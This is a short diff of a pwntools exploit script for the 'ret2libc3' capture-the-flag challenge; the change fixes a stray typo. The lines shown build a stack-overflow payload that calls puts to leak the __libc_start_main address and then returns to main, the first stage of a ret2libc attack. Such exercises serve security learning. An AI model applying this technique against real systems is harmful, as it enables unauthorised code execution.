@@ -11,7 +11,7 @@ main = ret2libc3.symbols['main']
 
 print("leak libc_start_main_got addr and return to main again")
 payload = flat([b'A' * 112, puts_plt, main, libc_start_main_got])
-sh.sendlineafter(b'Can you find it !?', payload)3
+sh.sendlineafter(b'Can you find it !?', payload)
 print("get the related addr")
 libc_start_main_addr = u32(sh.recv()[0:4])
 
